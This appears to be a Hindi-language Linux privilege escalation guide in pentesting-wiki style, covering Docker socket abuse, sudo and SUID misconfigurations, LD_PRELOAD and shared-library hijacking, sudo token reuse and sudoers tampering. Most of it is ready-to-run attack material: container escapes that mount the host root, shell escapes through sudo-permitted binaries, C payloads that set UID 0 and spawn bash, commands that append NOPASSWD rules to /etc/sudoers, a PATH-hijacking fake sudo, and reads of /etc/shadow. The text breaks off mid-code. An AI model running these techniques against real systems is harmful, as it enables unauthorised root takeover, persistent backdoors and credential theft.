Docker सॉकेट, जो अक्सर `/var/run/docker.sock` पर पाया जाता है, एक महत्वपूर्ण फ़ाइल है जिसे सुरक्षित किया जाना चाहिए। डिफ़ॉल्ट रूप से, यह `root` उपयोगकर्ता और `docker` समूह के सदस्यों द्वारा लिखा जा सकता है। इस सॉकेट तक लेखन पहुंच होना विशेषाधिकार वृद्धि का कारण बन सकता है। यहाँ बताया गया है कि यह कैसे किया जा सकता है और वैकल्पिक विधियाँ यदि Docker CLI उपलब्ध नहीं है।

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker सॉकेट तक लेखन पहुंच है, तो आप निम्नलिखित कमांड का उपयोग करके विशेषाधिकार बढ़ा सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको होस्ट के फ़ाइल सिस्टम पर रूट-स्तरीय पहुँच के साथ एक कंटेनर चलाने की अनुमति देती हैं।

#### **डॉकर एपीआई का सीधे उपयोग करना**

उन मामलों में जहाँ डॉकर CLI उपलब्ध नहीं है, डॉकर सॉकेट को डॉकर एपीआई और `curl` कमांड का उपयोग करके अभी भी संशोधित किया जा सकता है।

1.  **डॉकर इमेज़ की सूची:** उपलब्ध इमेज़ की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **एक कंटेनर बनाएं:** एक अनुरोध भेजें ताकि एक कंटेनर बनाया जा सके जो होस्ट सिस्टम की रूट डायरेक्टरी को माउंट करे।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नए बनाए गए कंटेनर को शुरू करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **कंटेनर से जुड़ें:** कंटेनर से कनेक्शन स्थापित करने के लिए `socat` का उपयोग करें, जिससे इसके भीतर कमांड निष्पादन सक्षम हो सके।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` कनेक्शन सेट करने के बाद, आप होस्ट के फ़ाइल सिस्टम पर रूट-स्तरीय पहुँच के साथ सीधे कंटेनर में कमांड निष्पादित कर सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास डॉकर सॉकेट पर लिखने की अनुमति है क्योंकि आप **`docker` समूह के अंदर हैं** तो आपके पास [**अधिकार बढ़ाने के अधिक तरीके हैं**](interesting-groups-linux-pe/index.html#docker-group)। यदि [**डॉकर एपीआई किसी पोर्ट पर सुन रहा है** तो आप इसे भी समझौता कर सकते हैं](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

**डॉकर से बाहर निकलने या इसे अधिकार बढ़ाने के लिए दुरुपयोग करने के अधिक तरीकों की जाँच करें**:

{{#ref}}
docker-security/
{{#endref}}

## कंटेनरडी (ctr) अधिकार बढ़ाना

यदि आप पाते हैं कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो कृपया निम्नलिखित पृष्ठ पढ़ें क्योंकि **आप इसे अधिकार बढ़ाने के लिए दुरुपयोग कर सकते हैं**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** अधिकार बढ़ाना

यदि आप पाते हैं कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो कृपया निम्नलिखित पृष्ठ पढ़ें क्योंकि **आप इसे अधिकार बढ़ाने के लिए दुरुपयोग कर सकते हैं**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक जटिल **इंटर-प्रोसेस कम्युनिकेशन (IPC) सिस्टम** है जो अनुप्रयोगों को कुशलता से बातचीत करने और डेटा साझा करने में सक्षम बनाता है। इसे आधुनिक लिनक्स सिस्टम को ध्यान में रखकर डिज़ाइन किया गया है, यह विभिन्न प्रकार के अनुप्रयोग संचार के लिए एक मजबूत ढांचा प्रदान करता है।

यह प्रणाली बहुपरकारी है, जो प्रक्रियाओं के बीच डेटा विनिमय को बढ़ाने के लिए बुनियादी IPC का समर्थन करती है, जो **सुधारित UNIX डोमेन सॉकेट्स** की याद दिलाती है। इसके अलावा, यह घटनाओं या संकेतों का प्रसारण करने में मदद करती है, जिससे सिस्टम घटकों के बीच निर्बाध एकीकरण को बढ़ावा मिलता है। उदाहरण के लिए, एक इनकमिंग कॉल के बारे में ब्लूटूथ डेमन से एक संकेत एक म्यूजिक प्लेयर को म्यूट करने के लिए प्रेरित कर सकता है, जिससे उपयोगकर्ता अनुभव में सुधार होता है। इसके अतिरिक्त, D-Bus एक दूरस्थ ऑब्जेक्ट सिस्टम का समर्थन करता है, जो अनुप्रयोगों के बीच सेवा अनुरोधों और विधि कॉल को सरल बनाता है, उन प्रक्रियाओं को सुव्यवस्थित करता है जो पारंपरिक रूप से जटिल थीं।

D-Bus एक **अनुमति/निषेध मॉडल** पर काम करता है, जो संदेश अनुमतियों (विधि कॉल, संकेत उत्सर्जन, आदि) का प्रबंधन करता है जो नीति नियमों के मिलन के प्रभाव पर आधारित होता है। ये नीतियाँ बस के साथ इंटरैक्शन को निर्दिष्ट करती हैं, जो इन अनुमतियों के शोषण के माध्यम से अधिकार बढ़ाने की अनुमति दे सकती हैं।

`/etc/dbus-1/system.d/wpa_supplicant.conf` में ऐसी नीति का एक उदाहरण प्रदान किया गया है, जो रूट उपयोगकर्ता के लिए `fi.w1.wpa_supplicant1` से संदेश भेजने, प्राप्त करने और स्वामित्व रखने की अनुमति को विस्तार से बताता है।

विशिष्ट उपयोगकर्ता या समूह के बिना नीतियाँ सार्वभौमिक रूप से लागू होती हैं, जबकि "डिफ़ॉल्ट" संदर्भ नीतियाँ उन सभी पर लागू होती हैं जो अन्य विशिष्ट नीतियों द्वारा कवर नहीं की गई हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ D-Bus संचार को सूचीबद्ध करने और शोषण करने का तरीका सीखें:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को सूचीबद्ध करना और मशीन की स्थिति का पता लगाना हमेशा दिलचस्प होता है।

### सामान्य सूचीबद्धता
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उस मशीन पर नेटवर्क सेवाओं की जांच करें जिनसे आप पहले बातचीत नहीं कर सके:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जांचें कि क्या आप ट्रैफ़िक को स्निफ़ कर सकते हैं। यदि आप ऐसा कर सकते हैं, तो आप कुछ क्रेडेंशियल्स प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

चेक करें **who** आप हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन से **login** कर सकते हैं और कौन से **root privileges** रखते हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो **UID > INT_MAX** वाले उपयोगकर्ताओं को विशेषाधिकार बढ़ाने की अनुमति देता है। अधिक जानकारी: [यहाँ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [यहाँ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [यहाँ](https://twitter.com/paragonsec/status/1071152249529884674)।\
**इसे एक्सप्लॉइट करें**: **`systemd-run -t /bin/bash`**

### Groups

जांचें कि क्या आप किसी **समूह के सदस्य** हैं जो आपको रूट विशेषाधिकार दे सकता है:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

जांचें कि क्या क्लिपबोर्ड के अंदर कुछ दिलचस्प है (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप **पर्यावरण का कोई पासवर्ड जानते हैं** तो **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने का प्रयास करें**।

### Su Brute

यदि आपको बहुत शोर करने में कोई आपत्ति नहीं है और `su` और `timeout` बाइनरी कंप्यूटर पर मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता को ब्रूट-फोर्स करने का प्रयास कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` पैरामीटर के साथ भी उपयोगकर्ताओं को ब्रूट-फोर्स करने का प्रयास करता है।

## लिखने योग्य PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप **$PATH के किसी फ़ोल्डर के अंदर लिख सकते हैं** तो आप **लिखने योग्य फ़ोल्डर के अंदर एक बैकडोर बनाने** के द्वारा विशेषाधिकार बढ़ा सकते हैं, जिसका नाम किसी कमांड के समान हो जो किसी अन्य उपयोगकर्ता (आदर्श रूप से रूट) द्वारा निष्पादित किया जाएगा और जो **आपके लिखने योग्य फ़ोल्डर के पहले स्थित फ़ोल्डर से लोड नहीं होता** है।

### SUDO और SUID

आपको sudo का उपयोग करके कुछ कमांड निष्पादित करने की अनुमति दी जा सकती है या उनके पास suid बिट हो सकता है। इसे जांचें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अप्रत्याशित कमांड आपको फ़ाइलें पढ़ने और/या लिखने या यहां तक कि एक कमांड निष्पादित करने की अनुमति देती हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन एक उपयोगकर्ता को बिना पासवर्ड जाने किसी अन्य उपयोगकर्ता के विशेषाधिकारों के साथ कुछ कमांड निष्पादित करने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है, अब रूट निर्देशिका में एक ssh कुंजी जोड़कर या `sh` को कॉल करके एक शेल प्राप्त करना सरल है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को **एक पर्यावरण चर सेट करने** की अनुमति देता है जबकि कुछ निष्पादित कर रहा है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
इस उदाहरण, **HTB मशीन Admirer** पर आधारित, **PYTHONPATH हाइजैकिंग** के लिए **संवेदनशील** था ताकि स्क्रिप्ट को रूट के रूप में निष्पादित करते समय एक मनमाना पायथन पुस्तकालय लोड किया जा सके:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo निष्पादन बाईपासिंग पथ

**कूदें** अन्य फ़ाइलों को पढ़ने के लिए या **साइमलिंक** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo कमांड/SUID बाइनरी बिना कमांड पथ के

यदि **sudo अनुमति** एकल कमांड को **पथ निर्दिष्ट किए बिना** दी गई है: _hacker10 ALL= (root) less_ तो आप इसे PATH वेरिएबल को बदलकर शोषण कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी उपयोग की जा सकती है यदि एक **suid** बाइनरी **बिना उसके पथ को निर्दिष्ट किए किसी अन्य कमांड को निष्पादित करती है (हमेशा एक अजीब SUID बाइनरी की सामग्री की जांच करने के लिए** _**strings**_ **का उपयोग करें)**।

[Payload examples to execute.](payloads-to-execute.md)

### कमांड पथ के साथ SUID बाइनरी

यदि **suid** बाइनरी **कमांड का पथ निर्दिष्ट करते हुए किसी अन्य कमांड को निष्पादित करती है**, तो आप उस कमांड के नाम से एक **फंक्शन** बनाने और उसे एक्सपोर्ट करने की कोशिश कर सकते हैं जिसे suid फ़ाइल कॉल कर रही है।

उदाहरण के लिए, यदि एक suid बाइनरी _**/usr/sbin/service apache2 start**_ को कॉल करती है, तो आपको फंक्शन बनाने और उसे एक्सपोर्ट करने की कोशिश करनी चाहिए:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid बाइनरी को कॉल करते हैं, तो यह फ़ंक्शन निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** पर्यावरण चर का उपयोग एक या अधिक साझा पुस्तकालयों (.so फ़ाइलें) को निर्दिष्ट करने के लिए किया जाता है जिन्हें लोडर द्वारा सभी अन्य के पहले लोड किया जाना है, जिसमें मानक C पुस्तकालय (`libc.so`) भी शामिल है। इस प्रक्रिया को पुस्तकालय को प्रीलोड करना कहा जाता है।

हालांकि, सिस्टम की सुरक्षा बनाए रखने और इस सुविधा के दुरुपयोग को रोकने के लिए, विशेष रूप से **suid/sgid** निष्पादन योग्य के साथ, सिस्टम कुछ शर्तों को लागू करता है:

- लोडर उन निष्पादन योग्य के लिए **LD_PRELOAD** की अनदेखी करता है जहाँ वास्तविक उपयोगकर्ता आईडी (_ruid_) प्रभावी उपयोगकर्ता आईडी (_euid_) से मेल नहीं खाती।
- suid/sgid वाले निष्पादन योग्य के लिए, केवल मानक पथों में पुस्तकालयों को प्रीलोड किया जाता है जो भी suid/sgid होते हैं।

अधिकार वृद्धि तब हो सकती है जब आपके पास `sudo` के साथ कमांड निष्पादित करने की क्षमता हो और `sudo -l` का आउटपुट **env_keep+=LD_PRELOAD** कथन को शामिल करता हो। यह कॉन्फ़िगरेशन **LD_PRELOAD** पर्यावरण चर को बनाए रखने और इसे मान्यता प्राप्त करने की अनुमति देता है, भले ही कमांड `sudo` के साथ चलाए जाएं, जो संभावित रूप से उच्चाधिकारों के साथ मनमाने कोड के निष्पादन की ओर ले जा सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **इसे संकलित करें**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **privileges को बढ़ाना** चलाते हुए
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> यदि हमलावर **LD_LIBRARY_PATH** env वेरिएबल को नियंत्रित करता है, तो एक समान प्रिवेस्क का दुरुपयोग किया जा सकता है क्योंकि वह उस पथ को नियंत्रित करता है जहाँ पुस्तकालयों की खोज की जाएगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID बाइनरी – .so इंजेक्शन

जब किसी बाइनरी में **SUID** अनुमतियाँ असामान्य लगती हैं, तो यह सुनिश्चित करना एक अच्छा अभ्यास है कि यह **.so** फ़ाइलें सही तरीके से लोड कर रही है। इसे निम्नलिखित कमांड चलाकर जांचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (कोई ऐसा फ़ाइल या निर्देशिका नहीं)"_ जैसी त्रुटि का सामना करना शोषण की संभावना का सुझाव देता है।

इसका शोषण करने के लिए, कोई एक C फ़ाइल बनाएगा, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार संकलित और निष्पादित होने पर, फ़ाइल अनुमतियों में हेरफेर करके और उच्चाधिकारों के साथ एक शेल निष्पादित करके विशेषाधिकारों को बढ़ाने का लक्ष्य रखता है।

उपरोक्त C फ़ाइल को साझा वस्तु (.so) फ़ाइल में संकलित करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंततः, प्रभावित SUID बाइनरी को चलाना एक्सप्लॉइट को ट्रिगर करना चाहिए, जिससे संभावित सिस्टम समझौता हो सके।

## साझा ऑब्जेक्ट हाइजैकिंग
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID बाइनरी खोज ली है जो एक ऐसे फ़ोल्डर से लाइब्रेरी लोड कर रही है जहाँ हम लिख सकते हैं, आइए उस फ़ोल्डर में आवश्यक नाम के साथ लाइब्रेरी बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको कोई त्रुटि मिलती है जैसे
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
यह मतलब है कि आपने जो पुस्तकालय उत्पन्न किया है, उसमें `a_function_name` नामक एक फ़ंक्शन होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix बाइनरीज़ की एक चयनित सूची है जिसे एक हमलावर स्थानीय सुरक्षा प्रतिबंधों को बायपास करने के लिए शोषित कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है लेकिन उन मामलों के लिए जहां आप केवल **आर्गुमेंट्स** को एक कमांड में **इंजेक्ट** कर सकते हैं।

यह परियोजना उन Unix बाइनरीज़ के वैध फ़ंक्शंस को इकट्ठा करती है जिन्हें प्रतिबंधित शेल से बाहर निकलने, विशेषाधिकारों को बढ़ाने या बनाए रखने, फ़ाइलों को स्थानांतरित करने, बाइंड और रिवर्स शेल को स्पॉन करने, और अन्य पोस्ट-शोषण कार्यों को सुविधाजनक बनाने के लिए दुरुपयोग किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}

{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` तक पहुँच सकते हैं, तो आप उपकरण [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर सकते हैं यह जांचने के लिए कि क्या यह किसी भी sudo नियम का शोषण करने का तरीका खोजता है।

### Sudo टोकन का पुन: उपयोग

उन मामलों में जहां आपके पास **sudo एक्सेस** है लेकिन पासवर्ड नहीं है, आप **sudo कमांड निष्पादन की प्रतीक्षा करके और फिर सत्र टोकन को हाईजैक करके** विशेषाधिकार बढ़ा सकते हैं।

विशेषाधिकार बढ़ाने की आवश्यकताएँ:

- आपके पास पहले से "_sampleuser_" उपयोगकर्ता के रूप में एक शेल है
- "_sampleuser_" ने **अंतिम 15 मिनट में कुछ निष्पादित करने के लिए `sudo` का उपयोग किया है** (डिफ़ॉल्ट रूप से, यह वह अवधि है जब sudo टोकन हमें बिना किसी पासवर्ड के `sudo` का उपयोग करने की अनुमति देता है)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 है
- `gdb` सुलभ है (आप इसे अपलोड करने में सक्षम हो सकते हैं)

(आप अस्थायी रूप से `ptrace_scope` को `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` के साथ सक्षम कर सकते हैं या `/etc/sysctl.d/10-ptrace.conf` को स्थायी रूप से संशोधित करके और `kernel.yama.ptrace_scope = 0` सेट करके)

यदि ये सभी आवश्यकताएँ पूरी होती हैं, तो **आप विशेषाधिकार बढ़ा सकते हैं:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **पहला शोषण** (`exploit.sh`) _/tmp_ में बाइनरी `activate_sudo_token` बनाएगा। आप इसका उपयोग अपने सत्र में **sudo टोकन को सक्रिय करने** के लिए कर सकते हैं (आपको स्वचालित रूप से एक रूट शेल नहीं मिलेगा, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **दूसरा एक्सप्लॉइट** (`exploit_v2.sh`) _/tmp_ में **रूट द्वारा सेटयूआईडी के साथ एक श शेल बनाएगा**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- तीसरा **एक्सप्लॉइट** (`exploit_v3.sh`) **एक sudoers फ़ाइल बनाएगा** जो **sudo टोकन को शाश्वत बनाता है और सभी उपयोगकर्ताओं को sudo का उपयोग करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **लेखन अनुमतियाँ** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **एक उपयोगकर्ता और PID के लिए sudo टोकन बना सकते हैं**।\
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को अधिलेखित कर सकते हैं और आपके पास उस उपयोगकर्ता के रूप में PID 1234 के साथ एक शेल है, तो आप **sudo विशेषाधिकार प्राप्त कर सकते हैं** बिना पासवर्ड जाने:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फाइल `/etc/sudoers` और फाइलें `/etc/sudoers.d` के अंदर यह निर्धारित करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फाइलें **डिफ़ॉल्ट रूप से केवल उपयोगकर्ता रूट और समूह रूट द्वारा पढ़ी जा सकती हैं**।\
**यदि** आप इस फाइल को **पढ़** सकते हैं तो आप **कुछ दिलचस्प जानकारी प्राप्त कर सकते हैं**, और यदि आप कोई फाइल **लिख** सकते हैं तो आप **अधिकार बढ़ा** सकेंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन अनुमतियों का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प हैं जैसे कि OpenBSD के लिए `doas`, इसकी कॉन्फ़िगरेशन `/etc/doas.conf` पर जांचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **उपयोगकर्ता आमतौर पर एक मशीन से कनेक्ट होता है और विशेषाधिकार बढ़ाने के लिए `sudo` का उपयोग करता है** और आपके पास उस उपयोगकर्ता संदर्भ में एक शेल है, तो आप **एक नया sudo निष्पादन योग्य बना सकते हैं** जो आपके कोड को रूट के रूप में और फिर उपयोगकर्ता के कमांड को निष्पादित करेगा। फिर, **उपयोगकर्ता संदर्भ का $PATH संशोधित करें** (उदाहरण के लिए .bash_profile में नया पथ जोड़कर) ताकि जब उपयोगकर्ता sudo निष्पादित करे, तो आपका sudo निष्पादन योग्य निष्पादित हो।

ध्यान दें कि यदि उपयोगकर्ता एक अलग शेल का उपयोग करता है (bash नहीं) तो आपको नए पथ को जोड़ने के लिए अन्य फ़ाइलों को संशोधित करने की आवश्यकता होगी। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में एक और उदाहरण पा सकते हैं।

या कुछ ऐसा चलाना:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

फाइल `/etc/ld.so.conf` **यह दर्शाती है कि लोड की गई कॉन्फ़िगरेशन फ़ाइलें कहाँ से हैं**। आमतौर पर, इस फ़ाइल में निम्नलिखित पथ होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फ़ाइलें **अन्य फ़ोल्डरों की ओर इशारा करती हैं** जहाँ **लाइब्रेरी** **खोजी** जाएँगी। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री है `/usr/local/lib`। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर लाइब्रेरी खोजेगा**।

यदि किसी कारणवश **किसी उपयोगकर्ता के पास लिखने की अनुमति है** किसी भी पथ पर जो संकेतित हैं: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल या `/etc/ld.so.conf.d/*.conf` के अंदर कॉन्फ़िगरेशन फ़ाइल के भीतर कोई भी फ़ोल्डर, तो वह विशेषाधिकार बढ़ाने में सक्षम हो सकता है।\
इस गलत कॉन्फ़िगरेशन का **शोषण कैसे करें** इस पृष्ठ पर देखें:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/` में lib को कॉपी करके, इसे `RPATH` वेरिएबल में निर्दिष्ट स्थान पर प्रोग्राम द्वारा उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में एक बुरा लाइब्रेरी बनाएं `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

